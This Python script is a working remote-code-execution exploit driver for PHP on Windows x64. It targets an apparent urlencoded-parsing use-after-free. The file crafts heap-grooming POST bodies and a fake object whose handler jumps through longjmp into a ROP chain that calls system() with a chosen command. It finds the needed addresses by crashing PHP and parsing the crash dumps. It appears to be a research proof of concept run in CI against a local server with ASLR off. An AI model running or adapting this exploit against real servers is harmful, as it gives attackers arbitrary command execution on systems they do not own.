#!/usr/bin/env python3
'''p2s win_rce.py v3 — Windows x64 RCE chain driver (CVE-2026-109618 urlencoded OOM->UAF->free_obj->longjmp->system).

v3 changes (from CI receipts):
  - Ladder now varies memory_limit too: on 7.4.33/8.0.30 the OOM always strikes
    the clean 81920B hash-grow path at 8M (fatal in-band, walk clean, php alive);
    a different limit shifts the strike point into the dirty window (unwritten
    bucket). On 8.2.12 the canonical shape+8M already crashes (php_exit 0xC0000005).
  - Dump instruments doubled: WER LocalDumps (registered via winreg, values
    read back as receipt, sacrificial python self-test crash proves WerFault
    end-to-end) PLUS procdump64 -accepteula -e -ma -w php.exe watcher
    (Sysinternals, downloaded in-run) which writes a full dump on unhandled
    exception WITHOUT depending on WER. parse whichever dump lands first.
  - wait_dump scans dump-dir and %LOCALAPPDATA%\CrashDumps.
  - Fire stage reuses the winning shape AND winning memory_limit.

Chain: OOM leaves the HashTable half-built (bucket unwritten); shutdown walks it,
  dtor dereferences zval.value at the unwritten bucket. Feng-shui places our pad
  value in that slot: probe 0xdead0001+IS_STRING -> AV; rce fake object ->
  handlers->free_obj = ucrtbase!longjmp(obj=jmp_buf) -> pop rcx;ret -> system(cmd).
  Constants measured in-run (ASLR off via workflow Set-ProcessMitigation).

Exit codes: 0=RCE receipt | 10 control fail | 11 no attempt crashed | 12 no dump
            13 marker/consts not found | 14 fire produced no marker file.
'''
import argparse, glob, json, mmap, os, socket, struct, subprocess, sys, time, zipfile
from datetime import datetime, timezone
from urllib.parse import quote_from_bytes

def p64(v): return struct.pack('<Q', v)
def p32(v): return struct.pack('<I', v)

IS_WIN = os.name == 'nt'

# ---------------------------------------------------------------- http ----
def http_post(host, port, body, ctype, timeout=120, path='/index.php'):
    hdr = (f'POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n'
           f'Content-Type: {ctype}\r\nContent-Length: {len(body)}\r\n'
           f'Connection: close\r\n\r\n').encode()
    with socket.create_connection((host, port), timeout=timeout) as s:
        s.settimeout(timeout)
        s.sendall(hdr)
        s.sendall(body)
        chunks = []
        try:
            while True:
                d = s.recv(65536)
                if not d: break
                chunks.append(d)
        except (socket.timeout, OSError) as exc:
            return {'error': f'read: {type(exc).__name__}: {exc}'}
    raw = b''.join(chunks)
    head, _, b = raw.partition(b'\r\n\r\n')
    toks = head.split(b'\r\n')[0].split()
    status = int(toks[1]) if len(toks) > 1 and toks[1].isdigit() else None
    return {'status': status, 'body': b[:2048], 'body_len': len(b)}

def http_get(host, port, path='/index.php', timeout=20):
    hdr = (f'GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\nConnection: close\r\n\r\n').encode()
    with socket.create_connection((host, port), timeout=timeout) as s:
        s.settimeout(timeout)
        s.sendall(hdr)
        chunks = []
        try:
            while True:
                d = s.recv(65536)
                if not d: break
                chunks.append(d)
        except (socket.timeout, OSError):
            pass
    raw = b''.join(chunks)
    toks = raw.split(b'\r\n')[0].split()
    return {'status': int(toks[1]) if len(toks) > 1 and toks[1].isdigit() else None,
            'body': raw.partition(b'\r\n\r\n')[2][:512]}

# ---------------------------------------------------------------- arm ----
def build_body(pad, memshift=40000, k1=30, k2=30, xlen=79984):
    out = b'memshift=' + b'M' * memshift + b'&'
    for i in range(k1):
        out += b'a[' + b'X' * xlen + b'%016d' % i + b'][c]=v&'
    out += b'pad=' + quote_from_bytes(pad, safe='').encode() + b'&'
    out += b'pad=x&'
    for i in range(k1, k1 + k2):
        out += b'a[' + b'X' * xlen + b'%016d' % i + b'][c]=v&'
    return out[:-1]

def build_probe_pad(padlen=2528):
    pad = bytearray(padlen)
    pad[1928:1936] = p64(0xdead0001)
    pad[1936:1940] = p32(0x106)                 # IS_STRING
    return bytes(pad)

def build_rce_pad(padlen, PAD, LONGJMP, SYSTEM, POPRCX, cmd):
    pad = bytearray(padlen)
    fo = PAD + 2056
    pad[1928:1936] = p64(fo)                     # unwritten bucket zval.value
    pad[1936:1940] = p32(0x108)                  # IS_OBJECT | GC_NOT_COLLECTABLE
    pad[1940:1944] = p32(0)
    pad[2056:2060] = p32(1)                      # gc.refcount
    pad[2060:2064] = p32(0x108)                  # gc.type_info
    pad[2064:2068] = p32(0)                      # handle
    pad[2072:2080] = p64(0)                      # ce
    pad[2080:2088] = p64(PAD + 2000)             # handlers
    pad[2008:2016] = p64(LONGJMP)                # handlers->free_obj (handlers+8)
    pad[2088:2096] = p64(PAD + 2352)             # jmp_buf rsp @ fo+32
    pad[2096:2104] = p64(POPRCX)                 # jmp_buf rip @ fo+40
    pad[2352:2360] = p64(PAD + 2400)             # fake stack: popped -> rcx = &cmd
    pad[2360:2368] = p64(SYSTEM)                 # ret -> system(rcx)
    pad[2368:2376] = p64(0)                       # system returns -> crash (receipt already on disk)
    c = cmd if isinstance(cmd, bytes) else cmd.encode()
    pad[2400:2400 + len(c) + 1] = c + b'\x00'
    return bytes(pad)

# ---------------------------------------------------------------- PE ----
def pe_sections(data):
    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
    nsec = struct.unpack_from('<H', data, e_lfanew + 6)[0]
    opt_size = struct.unpack_from('<H', data, e_lfanew + 20)[0]
    sec0 = e_lfanew + 24 + opt_size
    out = []
    for i in range(nsec):
        o = sec0 + i * 40
        name = data[o:o + 8].rstrip(b'\x00').decode('latin-1')
        vsize, va, rsize, roff = struct.unpack_from('<IIII', data, o + 8)
        out.append({'name': name, 'va': va, 'vsize': vsize, 'raw': roff, 'rsize': rsize})
    return out

def rva_to_off(sections, rva):
    for s in sections:
        if s['va'] <= rva < s['va'] + max(s['vsize'], s['rsize']):
            d = rva - s['va']
            if d < s['rsize']:
                return s['raw'] + d
    return None

def pe_image_base(data):
    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
    magic = struct.unpack_from('<H', data, e_lfanew + 24)[0]
    if magic == 0x20b:
        return struct.unpack_from('<Q', data, e_lfanew + 24 + 24)[0]
    return struct.unpack_from('<I', data, e_lfanew + 24 + 28)[0]

def pe_exports(data, wanted):
    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
    opt = e_lfanew + 24
    magic = struct.unpack_from('<H', data, opt)[0]
    dd = opt + (0x70 if magic == 0x20b else 0x60)
    exp_rva, exp_size = struct.unpack_from('<II', data, dd)
    sections = pe_sections(data)
    eo = rva_to_off(sections, exp_rva)
    if eo is None:
        return {}
    nfun, nnames, addrfun, addrnames, addroords = struct.unpack_from('<IIIII', data, eo + 20)
    out = {}
    for i in range(nnames):
        nrva = struct.unpack_from('<I', data, rva_to_off(sections, addrnames) + 4 * i)[0]
        no = rva_to_off(sections, nrva)
        name = data[no:data.index(b'\x00', no)].decode('latin-1')
        if name in wanted:
            ordn = struct.unpack_from('<H', data, rva_to_off(sections, addroords) + 2 * i)[0]
            frva = struct.unpack_from('<I', data, rva_to_off(sections, addrfun) + 4 * ordn)[0]
            out[name] = frva
    return out

def find_pop_rcx_ret(path):
    with open(path, 'rb') as f:
        data = f.read()
    sections = pe_sections(data)
    text = next(s for s in sections if s['name'] == '.text')
    blob = data[text['raw']:text['raw'] + text['rsize']]
    hits = []
    start = 0
    while True:
        i = blob.find(b'\x59\xc3', start)
        if i < 0:
            break
        hits.append(text['va'] + i)
        start = i + 1
    return hits

# ---------------------------------------------------------------- minidump ----
def parse_minidump(path, marker=b'\x01\x00\xad\xde\x06\x01\x00\x00', marker_pad_off=1928):
    f = open(path, 'rb')
    mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
    if mm[:4] != b'MDMP':
        raise ValueError('not a minidump')
    nstreams = struct.unpack_from('<I', mm, 12)[0]
    dirrva = struct.unpack_from('<I', mm, 16)[0]
    modules, exc, ranges = [], None, []
    for i in range(nstreams):
        st, ds, rva = struct.unpack_from('<III', mm, dirrva + i * 12)
        if st == 4:                                     # ModuleListStream
            n = struct.unpack_from('<I', mm, rva)[0]
            for j in range(n):
                o = rva + 4 + j * 108
                base, size = struct.unpack_from('<QI', mm, o)[0:2]
                name_rva = struct.unpack_from('<I', mm, o + 20)[0]
                ln = struct.unpack_from('<I', mm, name_rva)[0]
                name = mm[name_rva + 4:name_rva + 4 + ln].decode('utf-16-le')
                modules.append({'base': base, 'size': size, 'name': name})
        elif st == 6:                                   # ExceptionStream
            tid = struct.unpack_from('<I', mm, rva)[0]
            code, flags, rec, addr, nparams = struct.unpack_from('<IIQQI', mm, rva + 8)[:5]
            params = [struct.unpack_from('<Q', mm, rva + 8 + 40 + 8 * k)[0] for k in range(min(nparams, 4))]
            cdsz, cdrva = struct.unpack_from('<II', mm, rva + 8 + 152)
            rip = struct.unpack_from('<Q', mm, cdrva + 0xF8)[0]
            rsp = struct.unpack_from('<Q', mm, cdrva + 0x98)[0]
            rcx = struct.unpack_from('<Q', mm, cdrva + 0x80)[0]
            exc = {'code': code, 'addr': addr, 'params': params, 'rip': rip, 'rsp': rsp, 'rcx': rcx, 'tid': tid}
        elif st == 9:                                   # Memory64ListStream
            nranges, base_rva = struct.unpack_from('<QQ', mm, rva)
            off = base_rva
            for j in range(nranges):
                s, sz = struct.unpack_from('<QQ', mm, rva + 16 + j * 16)
                ranges.append({'start': s, 'size': sz, 'file_off': off})
                off += sz
    hits = []
    for r in ranges:
        if r['size'] < marker_pad_off + len(marker):
            continue
        i = mm.find(marker, r['file_off'], r['file_off'] + r['size'])
        while i >= 0:
            if i - r['file_off'] >= marker_pad_off:
                hits.append(r['start'] + (i - r['file_off']) - marker_pad_off)
            i = mm.find(marker, i + 1, r['file_off'] + r['size'])
    mm.close()
    f.close()
    return {'modules': modules, 'exc': exc, 'pad_hits': hits}

# ---------------------------------------------------------------- dump instruments ----
def wer_register(exe_name, dumpdir):
    if not IS_WIN:
        return {}
    import winreg
    sub = r'SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps\\' + exe_name
    try:
        k = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, sub, 0, winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE)
        winreg.SetValueEx(k, 'DumpFolder', 0, winreg.REG_SZ, dumpdir)
        winreg.SetValueEx(k, 'DumpType', 0, winreg.REG_DWORD, 2)
        winreg.SetValueEx(k, 'DumpCount', 0, winreg.REG_DWORD, 10)
        vals = {n: winreg.QueryValueEx(k, n)[0] for n in ('DumpFolder', 'DumpType', 'DumpCount')}
        k.Close()
        return vals
    except OSError as exc:
        return {'error': str(exc)}

def wer_selftest(dumpdir, stage, timeout=45):
    '''Sacrificial python crash -> proves the WerFault LocalDumps chain end-to-end.'''
    pre = set(glob.glob(os.path.join(dumpdir, '*.dmp')))
    vals = wer_register('python.exe', dumpdir)
    print('P2S_WER python.exe reg=' + json.dumps(vals))
    code = 'import ctypes; ctypes.string_at(0xdead0001)'
    try:
        subprocess.run([sys.executable, '-c', code], timeout=30,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass
    t0 = time.time()
    while time.time() - t0 < timeout:
        for d in glob.glob(os.path.join(dumpdir, '*.dmp')):
            if d not in pre and os.path.getsize(d) > 10000:
                print(f'P2S_WER_SELFTEST=DUMP {d}')
                return True
        time.sleep(2)
    print('P2S_WER_SELFTEST=NODUMP')
    return False

def procdump_start(stage, dumpdir, php_exe_name='php.exe'):
    '''Download Sysinternals procdump and start a crash watcher (no WER dependency).'''
    pd = os.path.join(stage, 'procdump64.exe')
    if not os.path.exists(pd):
        zp = os.path.join(stage, 'Procdump.zip')
        try:
            import urllib.request
            urllib.request.urlretrieve('https://download.sysinternals.com/files/Procdump.zip', zp)
            with zipfile.ZipFile(zp) as z:
                for n in z.namelist():
                    if n.lower().endswith('procdump64.exe'):
                        with z.open(n) as f, open(pd, 'wb') as g:
                            g.write(f.read())
        except Exception as exc:
            print(f'P2S_PROCDUMP download=FAIL {exc}')
            return None
    if not os.path.exists(pd):
        print('P2S_PROCDUMP=FAIL (no exe)')
        return None
    lg = open(os.path.join(stage, 'procdump.log'), 'ab')
    p = subprocess.Popen([pd, '-accepteula', '-e', '-ma', '-w', php_exe_name, dumpdir],
                         stdout=lg, stderr=lg)
    print(f'P2S_PROCDUMP watcher pid={p.pid} watching={php_exe_name} dir={dumpdir}')
    return p

# ---------------------------------------------------------------- php server ----
def wait_port(host, port, proc, timeout=25):
    t0 = time.time()
    while time.time() - t0 < timeout:
        if proc.poll() is not None:
            return False
        try:
            with socket.create_connection((host, port), timeout=2):
                return True
        except OSError:
            time.sleep(0.4)
    return False

def start_php(php_exe, host, port, docroot, ini, log):
    lf = open(log, 'ab')
    p = subprocess.Popen([php_exe, '-S', f'{host}:{port}', '-t', docroot, '-c', ini],
                         stdout=lf, stderr=lf)
    return p

def write_ini(php_dir, stage, mem_limit_mb):
    ini = os.path.join(php_dir, f'php_p2s_{mem_limit_mb}M.ini')
    with open(ini, 'w') as f:
        f.write(f'memory_limit={mem_limit_mb}M\npost_max_size=1G\ndisplay_errors=On\n'
                f'display_startup_errors=On\nerror_log={stage}\\php_err.log\n')
    return ini

def wait_dump(dumpdirs, deadline_s=150, exclude=None):
    exclude = exclude or set()
    t0 = time.time()
    seen = set()
    while time.time() - t0 < deadline_s:
        for d in glob.glob(os.path.join(dumpdirs, '*.dmp')):
            if d in seen or d in exclude:
                continue
            if os.path.getsize(d) > 100000:
                s1 = os.path.getsize(d)
                time.sleep(3)
                if os.path.getsize(d) == s1:
                    return d
                seen.add(d)
        time.sleep(2)
    return None

def scrub(o):
    if isinstance(o, dict):
        return {k: scrub(v) for k, v in o.items()}
    if isinstance(o, (list, tuple)):
        return [scrub(v) for v in o]
    if isinstance(o, bytes):
        return o.decode('latin-1', 'replace')
    return o

# ---------------------------------------------------------------- attempts ----
# (memshift, k1, k2, padlen, xlen, mem_limit_M) — canonical first (crashes 8.2.12
# at 8M per run 40271273745), then memory_limit ladder (moves the OOM strike
# point for 7.4/8.0 where 8M always hits the clean 81920B hash-grow).
SHAPES = [
    (40000, 30, 30, 2528, 79984, 8),    # canonical Linux chain-B
    (40000, 30, 30, 2528, 79984, 10),
    (40000, 30, 30, 2528, 79984, 12),
    (40000, 30, 30, 2528, 79984, 14),
    (40000, 30, 30, 2528, 79984, 16),
    (40000, 30, 30, 2528, 79984, 20),
    (40000, 30, 30, 2528, 79984, 24),
    (40000, 30, 30, 2528, 79984, 32),
    (60000, 30, 30, 2528, 79984, 16),
    (30000, 30, 30, 2528, 79984, 16),
    (40000, 30, 30, 2528, 79984, 48),
    (40000, 62, 62, 2528, 79984, 16),
    (40000, 30, 30, 2528, 79984, 64),
    (80000, 30, 30, 2528, 79984, 24),
    (120000, 30, 30, 2528, 79984, 32),
    (40000, 14, 14, 2528, 79984, 16),
    (40000, 46, 46, 2528, 79984, 24),
]

def shape_name(s):
    return f'M{s[0]},k{s[1]}+{s[2]},pad{s[3]},x{s[4]},lim{s[5]}M'

# ---------------------------------------------------------------- main ----
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--php-dir', required=True)
    ap.add_argument('--version', required=True)
    ap.add_argument('--host', default='127.0.0.1')
    ap.add_argument('--port', type=int, default=8080)
    ap.add_argument('--dump-dir', required=True)
    ap.add_argument('--ucrt', default='C:\\Windows\\System32\\ucrtbase.dll')
    ap.add_argument('--marker', required=True, help='absolute path of the RCE receipt file')
    ap.add_argument('--cmd', default=None)
    ap.add_argument('--out', default='win_rce_result.json')
    a = ap.parse_args()

    def save(res):
        json.dump(scrub(res), open(a.out, 'w'), indent=1)

    php_exe = os.path.join(a.php_dir, 'php.exe')
    stage = os.path.dirname(a.marker)
    os.makedirs(stage, exist_ok=True)
    os.makedirs(a.dump_dir, exist_ok=True)
    docroot = os.path.join(stage, 'docroot')
    os.makedirs(docroot, exist_ok=True)
    with open(os.path.join(docroot, 'index.php'), 'w') as f:
        f.write("<?php echo 'P2S-OK ' . PHP_VERSION . ' ' . php_uname('s');")
    if os.path.exists(a.marker):
        os.remove(a.marker)

    res = {'version': a.version, 'stage': stage, 'ts': datetime.now(timezone.utc).isoformat()}
    log = os.path.join(stage, 'php_server.log')

    # ---- dump instruments ---------------------------------------------------
    wer_vals = wer_register('php.exe', a.dump_dir)
    print('P2S_WER php.exe reg=' + json.dumps(wer_vals))
    wer_selftest(a.dump_dir, stage)
    pre_dumps = set(glob.glob(os.path.join(a.dump_dir, '*.dmp')))
    pd_proc = procdump_start(stage, a.dump_dir)
    crash_dirs = [a.dump_dir]
    cd = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'CrashDumps')
    if os.path.isdir(cd):
        crash_dirs.append(cd)

    # ---- ladder -------------------------------------------------------------
    ladder_log = []
    win_shape = None
    p_cur = None
    for si, sh in enumerate(SHAPES):
        try:
            p_cur.kill()
        except Exception:
            pass
        ini = write_ini(a.php_dir, stage, sh[5])
        p_cur = start_php(php_exe, a.host, a.port, docroot, ini, log)
        if not wait_port(a.host, a.port, p_cur):
            tail = open(log, 'rb').read()[-500:].decode('latin-1', 'replace') if os.path.exists(log) else ''
            print(f'P2S_LADDER attempt={si} shape={shape_name(sh)} server=DEAD-AT-START tail={tail!r}')
            ladder_log.append({'attempt': si, 'shape': sh, 'server': 'dead'})
            continue
        ctl = http_get(a.host, a.port)
        if ctl['status'] != 200:
            print(f'P2S_LADDER attempt={si} shape={shape_name(sh)} control={ctl["status"]}')
            ladder_log.append({'attempt': si, 'shape': sh, 'control': ctl['status']})
            continue
        body = build_body(build_probe_pad(sh[3]), memshift=sh[0], k1=sh[1], k2=sh[2], xlen=sh[4])
        pr = http_post(a.host, a.port, body, 'application/x-www-form-urlencoded')
        btxt = pr.get('body', b'')[:300].decode('latin-1', 'replace')
        t0 = time.time()
        while p_cur.poll() is None and time.time() - t0 < 25:
            time.sleep(0.5)
        rc = p_cur.poll()
        ent = {'attempt': si, 'shape': sh, 'resp': pr.get('status'), 'body_len': pr.get('body_len'),
               'php_exit': rc, 'err': pr.get('error'), 'resp_body': btxt[:300]}
        ladder_log.append(ent)
        print(f'P2S_LADDER attempt={si} shape={shape_name(sh)} body={len(body)}B resp={pr.get("status")} '
              f'err={pr.get("error")} php_exit={rc}')
        if btxt:
            print(f'P2S_LADDER resp_body={btxt!r}')
        if rc is not None:
            win_shape = sh
            res['win_shape'] = list(sh)
            res['ladder'] = ladder_log
            save(res)
            print(f'P2S_LADDER=KILLER shape={shape_name(sh)} php_exit={rc}')
            break
    if win_shape is None:
        res['ladder'] = ladder_log
        print('P2S_STAGE_PROBE=FAIL (no attempt crashed php)')
        save(res)
        return 11

    # ---- dump wait (WER or procdump, whichever lands) ------------------------
    dump = None
    for d in crash_dirs:
        dump = wait_dump(d, deadline_s=90, exclude=pre_dumps)
        if dump:
            break
    if not dump:
        print('P2S_STAGE_MEASURE=FAIL (no crash dump from WER or procdump)')
        pdlog = os.path.join(stage, 'procdump.log')
        if os.path.exists(pdlog):
            print('P2S_PROCDUMP_LOG ' + open(pdlog, 'rb').read()[-800:].decode('latin-1', 'replace'))
        save(res)
        return 12
    print(f'P2S_STAGE_MEASURE dump={dump} size={os.path.getsize(dump)}')
    res['dump'] = dump

    # ---- dump parse -> constants --------------------------------------------
    md = parse_minidump(dump)
    if not md['pad_hits']:
        print('P2S_STAGE_MEASURE=FAIL (marker not found in dump)')
        res['exc'] = md['exc']
        res['modules'] = md['modules']
        save(res)
        return 13
    PAD = md['pad_hits'][0]
    phpdll = [m for m in md['modules'] if m['name'].lower().endswith(('php7.dll', 'php8.dll'))]
    ucrt = [m for m in md['modules'] if m['name'].lower().endswith('ucrtbase.dll')]
    if not phpdll or not ucrt:
        print('P2S_STAGE_MEASURE=FAIL (php dll or ucrtbase not in module list)')
        res['modules'] = md['modules']
        save(res)
        return 13
    php_dll_base, php_dll_name = phpdll[0]['base'], os.path.basename(phpdll[0]['name'])
    ucrt_base = ucrt[0]['base']
    php_dll_file = os.path.join(a.php_dir, php_dll_name)
    with open(php_dll_file, 'rb') as f:
        pdata = f.read()
    print(f'P2S_STATIC_IMAGE_BASE {php_dll_name} on-disk ImageBase={pe_image_base(pdata):#x} '
          f'(ASLR off -> expect runtime base to match)')
    ucrt_file = a.ucrt
    if not os.path.exists(ucrt_file):
        ucrt_file = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'ucrtbase.dll')
    ex = md['exc'] or {}
    print('P2S_STAGE_MEASURE exc_code=%#x exc_addr=%#x p1=%#x rip=%#x rsp=%#x rcx=%#x' % (
        ex.get('code', 0), ex.get('addr', 0), (ex.get('params') or [0, 0])[0] if ex.get('params') else 0,
        ex.get('rip', 0), ex.get('rsp', 0), ex.get('rcx', 0)))
    hits = find_pop_rcx_ret(php_dll_file)
    if not hits:
        print('P2S_STAGE_MEASURE=FAIL (no pop rcx;ret in php dll)')
        save(res)
        return 13
    poprcx_rva = hits[len(hits) // 2]
    with open(ucrt_file, 'rb') as f:
        udata = f.read()
    exps = pe_exports(udata, {'system', 'longjmp'})
    if 'system' not in exps or 'longjmp' not in exps:
        print('P2S_STAGE_MEASURE=FAIL (ucrtbase exports: %s)' % list(exps))
        save(res)
        return 13
    consts = {
        'PAD': PAD,
        'php_dll': php_dll_name, 'php_dll_base': php_dll_base,
        'ucrt_base': ucrt_base,
        'poprcx_ret': php_dll_base + poprcx_rva, 'poprcx_rva': poprcx_rva,
        'system': ucrt_base + exps['system'], 'system_rva': exps['system'],
        'longjmp': ucrt_base + exps['longjmp'], 'longjmp_rva': exps['longjmp'],
        'PAD_mod16': PAD % 16,
    }
    res['consts'] = consts
    res['exc'] = ex
    print('P2S_CONSTS ' + json.dumps({k: (hex(v) if isinstance(v, int) else v) for k, v in consts.items()}))
    save(res)

    # ---- restart (winning memory limit, same boot, ASLR off -> same bases) ----
    try:
        p_cur.kill()
    except Exception:
        pass
    ini = write_ini(a.php_dir, stage, win_shape[5])
    p2 = None
    for port_backoff in range(4):
        p2 = start_php(php_exe, a.host, a.port, docroot, ini, log)
        if wait_port(a.host, a.port, p2):
            break
        p2.kill()
        time.sleep(2)
    else:
        print('P2S_STAGE_FIRE=FAIL (restart failed)')
        return 11
    ctl2 = http_get(a.host, a.port)
    print(f'P2S_STAGE_FIRE control2 status={ctl2["status"]} body={ctl2["body"][:80]!r}')

    # ---- fire RCE (winning shape + limit) ------------------------------------
    cmd = a.cmd or f'cmd /c whoami > "{a.marker}" 2>&1'
    if len(cmd) > 110:
        print('P2S_STAGE_FIRE=FAIL (cmd too long)')
        p2.kill()
        return 14
    pad = build_rce_pad(win_shape[3], consts['PAD'], consts['longjmp'], consts['system'],
                        consts['poprcx_ret'], cmd)
    body = build_body(pad, memshift=win_shape[0], k1=win_shape[1], k2=win_shape[2], xlen=win_shape[4])
    print(f'P2S_STAGE_FIRE body={len(body)}B cmd={cmd!r}')
    fr = http_post(a.host, a.port, body, 'application/x-www-form-urlencoded')
    print(f'P2S_STAGE_FIRE resp={fr.get("status")} err={fr.get("error")} body_len={fr.get("body_len")}')
    res['fire_resp'] = {k: v for k, v in fr.items() if k != 'body'}
    t0 = time.time()
    while time.time() - t0 < 30 and not os.path.exists(a.marker):
        time.sleep(1)
    if os.path.exists(a.marker):
        content = open(a.marker, 'rb').read()[:500].decode('latin-1', 'replace')
        print('P2S_RCE=PASS marker=' + repr(content))
        res['rce'] = 'PASS'
        res['marker_content'] = content
        try:
            p2.kill()
        except Exception:
            pass
        save(res)
        return 0
    rc = p2.poll()
    print(f'P2S_STAGE_FIRE php_exit={rc} marker=MISSING')
    res['rce'] = 'FAIL'
    try:
        p2.kill()
    except Exception:
        pass
    save(res)
    return 14

if __name__ == '__main__':
    sys.exit(main())
